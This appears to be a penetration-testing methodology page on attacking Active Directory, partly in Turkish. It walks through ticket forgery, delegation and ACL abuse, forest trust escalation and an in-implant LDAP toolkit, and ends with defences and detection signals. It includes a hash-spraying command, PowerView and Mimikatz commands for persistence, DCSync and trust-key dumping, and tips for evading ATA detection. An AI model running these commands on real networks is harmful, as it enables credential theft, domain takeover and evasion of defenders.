**Pass The Ticket (PTT)** saldırı yönteminde saldırganlar, parola ya da hash değerleri yerine **bir kullanıcının authentication ticket’ını çalar**. Çalınan bu ticket daha sonra **kullanıcıyı impersonate etmek** için kullanılır ve ağ içindeki kaynaklar ile hizmetlere yetkisiz erişim sağlar.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Eğer bir **local administrator**’ın **hash**’ine veya **password**’üne sahipsen, bununla diğer **PC**’lere **local olarak login** olmayı denemelisin.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note that this is quite **noisy** and **LAPS** would **mitigate** it.

### MSSQL Abuse & Trusted Links

If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host (if running as SA), **steal** the NetNTLM **hash** or even perform a **relay** **attack**.\
Also, if a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. These trusts can be chained and at some point the user might be able to find a misconfigured database where he can execute commands.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory and deployment suites often expose powerful paths to credentials and code execution. See:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

If you find any Computer object with the attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) and you have domain privileges in the computer, you will be able to dump TGTs from memory of every users that logins onto the computer.\
So, if a **Domain Admin logins onto the computer**, you will be able to dump his TGT and impersonate him using [Pass the Ticket](pass-the-ticket.md).\
Thanks to constrained delegation you could even **automatically compromise a Print Server** (hopefully it will be a DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

If a user or computer is allowed for "Constrained Delegation" it will be able to **impersonate any user to access some services in a computer**.\
Then, if you **compromise the hash** of this user/computer you will be able to **impersonate any user** (even domain admins) to access some services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Having **WRITE** privilege on an Active Directory object of a remote computer enables the attainment of code execution with **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

The compromised user could have some **interesting privileges over some domain objects** that could let you **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Discovering a **Spool service listening** within the domain can be **abused** to **acquire new credentials** and **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

If **other users** **access** the **compromised** machine, it's possible to **gather credentials from memory** and even **inject beacons in their processes** to impersonate them.\
Usually users will access the system via RDP, so here you have how to performa couple of attacks over third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** provides a system for managing the **local Administrator password** on domain-joined computers, ensuring it's **randomized**, unique, and frequently **changed**. These passwords are stored in Active Directory and access is controlled through ACLs to authorized users only. With sufficient permissions to access these passwords, pivoting to other computers becomes possible.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** from the compromised machine could be a way to escalate privileges inside the environment:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

If **vulnerable templates** are configured it's possible to abuse them to escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Once you get **Domain Admin** or even better **Enterprise Admin** privileges, you can **dump** the **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Some of the techniques discussed before can be used for persistence.\
For example you could:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** creates a **legitimate Ticket Granting Service (TGS) ticket** for a specific service by using the **NTLM hash** (for instance, the **hash of the PC account**). This method is employed to **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

A **Golden Ticket attack** involves an attacker gaining access to the **NTLM hash of the krbtgt account** in an Active Directory (AD) environment. This account is special because it's used to sign all **Ticket Granting Tickets (TGTs)**, which are essential for authenticating within the AD network.

Once the attacker obtains this hash, they can create **TGTs** for any account they choose (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

These are like golden tickets forged in a way that **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** is a very good way to be able to persist in the users account (even if he changes the password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

The **AdminSDHolder** object in Active Directory ensures the security of **privileged groups** (like Domain Admins and Enterprise Admins) by applying a standard **Access Control List (ACL)** across these groups to prevent unauthorized changes. However, this feature can be exploited; if an attacker modifies the AdminSDHolder's ACL to give full access to a regular user, that user gains extensive control over all privileged groups. This security measure, meant to protect, can thus backfire, allowing unwarranted access unless closely monitored.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Inside every **Domain Controller (DC)**, a **local administrator** account exists. By obtaining admin rights on such a machine, the local Administrator hash can be extracted using **mimikatz**. Following this, a registry modification is necessary to **enable the use of this password**, allowing for remote access to the local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

You could **give** some **special permissions** to a **user** over some specific domain objects that will let the user **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

The **security descriptors** are used to **store** the **permissions** an **object** have **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse the `dynamicObject` auxiliary class to create short-lived principals/GPOs/DNS records with `entryTTL`/`msDS-Entry-Time-To-Die`; they self-delete without tombstones, erasing LDAP evidence while leaving orphan SIDs, broken `gPLink` references, or cached DNS responses (e.g., AdminSDHolder ACE pollution or malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Alter **LSASS** in memory to establish a **universal password**, granting access to all domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
Note that if you use wrong data, pretty ugly logs will appear.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Previously we have discussed about how to escalate privileges if you have **enough permission to read LAPS passwords**. However, these passwords can also be used to **maintain persistence**.\
Check:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft views the **Forest** as the security boundary. This implies that **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is a security mechanism that enables a user from one **domain** to access resources in another **domain**. It essentially creates a linkage between the authentication systems of the two domains, allowing authentication verifications to flow seamlessly. When domains set up a trust, they exchange and retain specific **keys** within their **Domain Controllers (DCs)**, which are crucial to the trust's integrity.

In a typical scenario, if a user intends to access a service in a **trusted domain**, they must first request a special ticket known as an **inter-realm TGT** from their own domain's DC. This TGT is encrypted with a shared **key** that both domains have agreed upon. The user then presents this TGT to the **DC of the trusted domain** to get a service ticket (**TGS**). Upon successful validation of the inter-realm TGT by the trusted domain's DC, it issues a TGS, granting the user access to the service.

**Steps**:

1. A **client computer** in **Domain 1** starts the process by using its **NTLM hash** to request a **Ticket Granting Ticket (TGT)** from its **Domain Controller (DC1)**.
2. DC1 issues a new TGT if the client is authenticated successfully.
3. The client then requests an **inter-realm TGT** from DC1, which is needed to access resources in **Domain 2**.
4. The inter-realm TGT is encrypted with a **trust key** shared between DC1 and DC2 as part of the two-way domain trust.
5. The client takes the inter-realm TGT to **Domain 2's Domain Controller (DC2)**.
6. DC2 verifies the inter-realm TGT using its shared trust key and, if valid, issues a **Ticket Granting Service (TGS)** for the server in Domain 2 the client wants to access.
7. Finally, the client presents this TGS to the server, which is encrypted with the server’s account hash, to get access to the service in Domain 2.

### Different trusts

It's important to notice that **a trust can be 1 way or 2 ways**. In the 2 ways options, both domains will trust each other, but in the **1 way** trust relation one of the domains will be the **trusted** and the other the **trusting** domain. In the last case, **you will only be able to access resources inside the trusting domain from the trusted one**.

If Domain A trusts Domain B, A is the trusting domain and B ins the trusted one. Moreover, in **Domain A**, this would be an **Outbound trust**; and in **Domain B**, this would be an **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: This is a common setup within the same forest, where a child domain automatically has a two-way transitive trust with its parent domain. Essentially, this means that authentication requests can flow seamlessly between the parent and the child.
- **Cross-link Trusts**: Referred to as "shortcut trusts," these are established between child domains to expedite referral processes. In complex forests, authentication referrals typically have to travel up to the forest root and then down to the target domain. By creating cross-links, the journey is shortened, which is especially beneficial in geographically dispersed environments.
- **External Trusts**: These are set up between different, unrelated domains and are non-transitive by nature. According to [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts are useful for accessing resources in a domain outside of the current forest that isn't connected by a forest trust. Security is bolstered through SID filtering with external trusts.
- **Tree-root Trusts**: These trusts are automatically established between the forest root domain and a newly added tree root. While not commonly encountered, tree-root trusts are important for adding new domain trees to a forest, enabling them to maintain a unique domain name and ensuring two-way transitivity. More information can be found in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: This type of trust is a two-way transitive trust between two forest root domains, also enforcing SID filtering to enhance security measures.
- **MIT Trusts**: These trusts are established with non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts are a bit more specialized and cater to environments requiring integration with Kerberos-based systems outside the Windows ecosystem.

#### Other differences in **trusting relationships**

- A trust relationship can also be **transitive** (A trust B, B trust C, then A trust C) or **non-transitive**.
- A trust relationship can be set up as **bidirectional trust** (both trust each other) or as **one-way trust** (only one of them trust the other).

### Attack Path

1. **Enumerate** the trusting relationships
2. Check if any **security principal** (user/group/computer) has **access** to resources of the **other domain**, maybe by ACE entries or by being in groups of the other domain. Look for **relationships across domains** (the trust was created for this probably).
1. kerberoast in this case could be another option.
3. **Compromise** the **accounts** which can **pivot** through domains.

Attackers with could access to resources in another domain through three primary mechanisms:

- **Local Group Membership**: Principals might be added to local groups on machines, such as the “Administrators” group on a server, granting them significant control over that machine.
- **Foreign Domain Group Membership**: Principals can also be members of groups within the foreign domain. However, the effectiveness of this method depends on the nature of the trust and the scope of the group.
- **Access Control Lists (ACLs)**: Principals might be specified in an **ACL**, particularly as entities in **ACEs** within a **DACL**, providing them access to specific resources. For those looking to dive deeper into the mechanics of ACLs, DACLs, and ACEs, the whitepaper titled “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” is an invaluable resource.

### Find external users/groups with permissions

You can check **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** to find foreign security principals in the domain. These will be user/group from **an external domain/forest**.

You could check this in **Bloodhound** or using powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest ayrıcalık yükseltme
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Domain trust ilişkilerini enumerate etmenin diğer yolları:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> İki trusted key vardır, biri _Child --> Parent_ için, diğeri _Parent_ --> _Child_ için.\
> Geçerli domain tarafından kullanılanı şu şekilde alabilirsiniz:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

trust ile SID-History injection abuse ederek child/parent domain üzerinde Enterprise admin seviyesine yükselin:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC) yapısının nasıl exploit edilebileceğini anlamak kritiktir. Configuration NC, Active Directory (AD) ortamlarında bir forest genelindeki configuration verileri için merkezi bir repository görevi görür. Bu veri, forest içindeki her Domain Controller (DC)'a replike edilir ve writable DC'ler Configuration NC'nin writable bir kopyasını tutar. Bunu exploit etmek için, tercihen bir child DC üzerinde, **SYSTEM privileges** sahibi olmak gerekir.

**Link GPO to root DC site**

Configuration NC'nin Sites container'ı, AD forest içindeki domain-joined tüm bilgisayarların site bilgilerini içerir. Herhangi bir DC üzerinde SYSTEM privileges ile çalışarak, saldırganlar root DC sites'e GPO bağlayabilir. Bu işlem, bu sitelere uygulanan policy'leri manipüle ederek root domain'i ele geçirebilir.

Detaylı bilgi için [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) araştırmasına bakılabilir.

**Compromise any gMSA in the forest**

Bir attack vector, domain içindeki privileged gMSA'ları hedef almayı içerir. gMSA'ların password'lerini hesaplamak için gerekli olan KDS Root key, Configuration NC içinde saklanır. Herhangi bir DC üzerinde SYSTEM privileges ile KDS Root key'e erişmek ve forest genelindeki herhangi bir gMSA'nın password'ünü hesaplamak mümkündür.

Detaylı analiz ve adım adım rehber şu içerikte bulunabilir:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Tamamlayıcı delegated MSA attack (BadSuccessor – migration attributes abuse):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ek dış araştırma: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Bu yöntem sabır gerektirir ve yeni privileged AD objects oluşmasını beklemeyi içerir. SYSTEM privileges ile bir saldırgan, AD Schema'yı değiştirerek herhangi bir user'a tüm sınıflar üzerinde tam control verebilir. Bu, yeni oluşturulan AD objects üzerinde izinsiz erişim ve control ile sonuçlanabilir.

Daha fazla okuma için [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability, forest içindeki herhangi bir user olarak authentication sağlayan bir certificate template oluşturmak için Public Key Infrastructure (PKI) objects üzerindeki control'ü hedef alır. PKI objects Configuration NC içinde bulunduğundan, writable bir child DC'nin ele geçirilmesi ESC5 attack'lerinin yürütülmesini sağlar.

Bununla ilgili daha fazla detay [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) içinde okunabilir. ADCS olmayan senaryolarda, attacker gerekli bileşenleri kurma yeteneğine sahiptir; bu konu [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) içinde tartışılmaktadır.

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Bu senaryoda **domain’iniz güvenilir** olan harici bir domain tarafından size üzerinde **belirsiz yetkiler** veriliyor. **Domain’inizdeki hangi principal’ların harici domain üzerinde hangi erişime sahip olduğunu** bulmanız ve ardından bunu istismar etmeye çalışmanız gerekecek:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Bu senaryoda **alanınız**, **farklı alanlardan** bir gruba bazı **ayrıcalıklar** veriyor ve buna **güveniyor**.

Ancak, **bir alan başka bir alan tarafından trusted** edildiğinde, trusted alan **öngörülebilir bir ada sahip bir kullanıcı** oluşturur ve bunu **trusted password** ile **parola** olarak kullanır. Bu da, **trusting domain** içindeki bir kullanıcıya erişip trusted olanın içine girmek, onu enumerate etmek ve daha fazla ayrıcalık yükseltmeyi denemek için mümkün olduğu anlamına gelir:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Trusted alanı ele geçirmenin başka bir yolu, domain trust’ın **ters yönünde** oluşturulmuş bir [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) bulmaktır (bu çok yaygın değildir).

Trusted alanı ele geçirmenin başka bir yolu da, **trusted domain** içinden bir **kullanıcının erişebildiği** bir makinede **RDP** ile oturum açılmasını beklemektir. Sonra saldırgan, RDP session process içine code enjekte edebilir ve oradan kurbanın **origin domain**’ine erişebilir.\
Ayrıca, eğer **kurban hard drive**’ını bağladıysa, **RDP session** process’inden saldırgan hard drive’ın **startup folder**’ına **backdoor** yerleştirebilir. Bu tekniğe **RDPInception** denir.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- SID history attribute üzerinden forest trust’lar arasında yapılan saldırı riski, varsayılan olarak tüm inter-forest trust’larda etkin olan SID Filtering ile azaltılır. Bu, Microsoft’un yaklaşımına göre güvenlik sınırı olarak domain yerine forest’ı dikkate alarak intra-forest trust’ların güvenli olduğu varsayımına dayanır.
- Ancak bir nokta var: SID filtering uygulamaları ve kullanıcı erişimini bozabilir; bu yüzden zaman zaman devre dışı bırakılabilir.

### **Selective Authentication:**

- Inter-forest trust’lar için Selective Authentication kullanmak, iki forest’taki kullanıcıların otomatik olarak authenticate edilmemesini sağlar. Bunun yerine, kullanıcıların trusting domain veya forest içindeki domain’lere ve server’lara erişmesi için açık izinler gerekir.
- Bu önlemlerin, writable Configuration Naming Context (NC) istismarı veya trust account’a yönelik saldırılara karşı koruma sağlamadığını belirtmek önemlidir.

[**Domain trust’ları hakkında daha fazla bilgi ired.team üzerinde.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## On-Host Implant’lardan LDAP tabanlı AD Abuse

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection), bloodyAD tarzı LDAP primitive’lerini, tamamen on-host implant içinde çalışan x64 Beacon Object Files olarak yeniden uygular (ör. Adaptix C2). Operatörler paketi `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` ile derler, `ldap.axs` yükler ve ardından beacon’dan `ldap <subcommand>` çağırır. Tüm trafik, mevcut logon security context üzerinden LDAP (389) ile signing/sealing ya da auto certificate trust ile LDAPS (636) üzerinden gider; bu yüzden socks proxy’lere veya disk artifact’larına gerek yoktur.

### Implant tarafında LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` ve `get-groupmembers`, kısa adları/OU yollarını tam DN’lere çözer ve ilgili objeleri döker.
- `get-object`, `get-attribute` ve `get-domaininfo`, rootDSE’den forest/domain metadata’sı ile birlikte keyfi attribute’ları (security descriptor’lar dahil) çeker.
- `get-uac`, `get-spn`, `get-delegation` ve `get-rbcd`, roasting adaylarını, delegation ayarlarını ve mevcut [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptor’larını doğrudan LDAP’dan açığa çıkarır.
- `get-acl` ve `get-writable --detailed`, trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) ve inheritance’ı listelemek için DACL’yi ayrıştırır; böylece ACL privilege escalation için anında hedefler sağlar.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Yükseltme ve kalıcılık için LDAP write primitives

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`), operator’e OU rights bulunan her yerde yeni principals veya machine accounts hazırlama imkanı verir. `add-groupmember`, `set-password`, `add-attribute`, ve `set-attribute`, write-property rights bulunduğunda target’ları doğrudan ele geçirir.
- ACL odaklı commands olan `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, ve `add-dcsync`, herhangi bir AD object üzerindeki WriteDACL/WriteOwner yetkilerini password reset, group membership control veya DCSync replication privileges’a dönüştürür; bunu yaparken PowerShell/ADSI artifacts bırakmaz. `remove-*` karşılıkları enjekte edilmiş ACE’leri temizler.

### Delegation, roasting ve Kerberos abuse

- `add-spn`/`set-spn`, ele geçirilmiş bir user’ı anında Kerberoastable hale getirir; `add-asreproastable` (UAC toggle) password’a dokunmadan onu AS-REP roasting için işaretler.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`), beacon üzerinden `msDS-AllowedToDelegateTo`, UAC flags veya `msDS-AllowedToActOnBehalfOfOtherIdentity` alanlarını yeniden yazar; böylece constrained/unconstrained/RBCD saldırı yollarını açar ve remote PowerShell veya RSAT ihtiyacını ortadan kaldırır.

### sidHistory injection, OU relocation ve attack surface şekillendirme

- `add-sidhistory`, controlled principal’ın SID history’sine privileged SID’ler enjekte eder ([SID-History Injection](sid-history-injection.md) bölümüne bakın) ve tamamen LDAP/LDAPS üzerinden gizli access inheritance sağlar.
- `move-object`, computers veya users’ın DN/OU bilgisini değiştirir; böylece attacker, varlıkları delegatated rights’ın zaten bulunduğu OUs içine taşıyabilir ve ardından `set-password`, `add-groupmember`, veya `add-spn` abuse edebilir.
- Sıkı kapsamlı removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, vb.), operator credentials veya persistence topladıktan sonra hızlı rollback yapılmasını sağlar ve telemetry’yi minimize eder.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Bazı Genel Savunmalar

[**Credentials’ı nasıl koruyacağınız hakkında daha fazla bilgi edinin.**](../stealing-credentials/credentials-protections.md)

### **Credentials Protection için Defensive Measures**

- **Domain Admins Restrictions**: Domain Admins’in yalnızca Domain Controllers’a login olmasına izin verilmesi, diğer host’larda kullanımından kaçınılması önerilir.
- **Service Account Privileges**: Güvenliği korumak için services, Domain Admin (DA) privileges ile çalıştırılmamalıdır.
- **Temporal Privilege Limitation**: DA privileges gerektiren task’lar için süreleri sınırlandırılmalıdır. Bu şu şekilde yapılabilir: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event ID 2889/3074/3075’i audit edin ve ardından LDAP MITM/relay girişimlerini engellemek için DC’lerde/clients üzerinde LDAP signing ile LDAPS channel binding zorunlu hale getirin.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity’si için protocol-level fingerprinting

Sık kullanılan AD tradecraft’ı tespit etmek istiyorsanız, **yalnızca** yeniden adlandırılmış binaries, service names, temp batch files veya output paths gibi operator-controlled artifacts’a güvenmeyin. Meşru Windows clients’ın [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC ve WMI traffic’ini nasıl oluşturduğuna dair baseline çıkarın; ardından operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` veya `ntlmrelayx.py` üzerinde değişiklik yapmış olsa bile kalan **implementation quirks**’leri arayın.

- **Yüksek güvenilirlikte bağımsız adaylar** (kendi baseline’ınızla doğruladıktan sonra):
- `auth_context_id = 79231 + ctx_id` kullanan authenticated DCE/RPC
- `0xff` ile doldurulmuş DCE/RPC authentication padding
- Raw Kerberos `AP-REQ`’yi doğrudan SPNEGO `mechToken` içine koyan LDAP Kerberos binds
- ASCII benzeri görünen `ClientGuid` değerlerine sahip SMB2/3 negotiate requests
- Standart dışı `//./root/cimv2` namespace’i kullanan WMI `IWbemLevel1Login::NTLMLogin`
- Hardcoded Kerberos nonce values
- **Correlation/scoring features olarak daha iyi**:
- Seyrek veya kopyalanmış Kerberos etype listeleri, alışılmadık/eksik `PA-DATA`, ya da native Windows’tan farklı TGS-REQ etype sıralaması
- Version info’su olmayan NTLM Type 1 mesajları veya null host names içeren Type 3 mesajları
- SPNEGO yerine DCE/RPC içinde taşınan raw NTLMSSP, eksik DCE/RPC verification trailers veya SPNEGO/Kerberos OID uyumsuzlukları
- Aynı host/user/session/time window’dan gelen bu trait’lerden birkaçının birlikte görülmesi, tek bir zayıf field’dan çok daha güçlüdür
- **Enrichment olarak kullanın, standalone alert olarak değil**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names ve tool-specific HTTP/WebDAV/RDP/MSSQL strings
- Bunlar operator tarafından kolayca değiştirilebilir; cross-protocol cluster’ın neden şüpheli olduğunu açıklamak için en iyi şekilde kullanılır
- **Operational notes**:
- Bu sinyallerin bazıları decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW veya service-side visibility gerektirir
- Alert’e yükseltmeden önce Samba/Linux clients, appliances ve legacy software ile doğrulayın
- Güven arttıkça detections’ı enrichment -> hunting -> alerting olarak ilerletin

### **Deception Techniques Implementing**

- Deception uygulamak; decoy users veya computers gibi tuzaklar kurmayı, password’un expire olmaması ya da Trusted for Delegation olarak işaretlenmesi gibi özellikleri içermeyi kapsar. Detaylı yaklaşım, belirli rights’lara sahip users oluşturmayı veya onları yüksek ayrıcalıklı gruplara eklemeyi içerir.
- Pratik bir örnek şu araçları kullanır: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception techniques dağıtımı hakkında daha fazla bilgiye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) üzerinden ulaşılabilir.

### **Deception’ı Belirleme**

- **User Objects için**: Şüpheli göstergeler arasında atypical ObjectSID, nadir logon’lar, creation dates ve düşük bad password sayıları bulunur.
- **Genel Göstergeler**: Potansiyel decoy objects’in attributes’larını gerçek olanlarla karşılaştırmak tutarsızlıkları ortaya çıkarabilir. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) gibi tools bu tür deception’ları belirlemede yardımcı olabilir.

### **Detection Systems’i Bypass Etme**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection’ını önlemek için Domain Controllers üzerinde session enumeration yapmaktan kaçının.
- **Ticket Impersonation**: Ticket oluştururken **aes** keys kullanmak, NTLM’e downgrade etmeyerek detection’dan kaçınmaya yardımcı olur.
- **DCSync Attacks**: ATA detection’ından kaçınmak için Domain Controller olmayan bir yerden çalıştırmak önerilir; çünkü doğrudan Domain Controller’dan çalıştırma alert tetikler.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
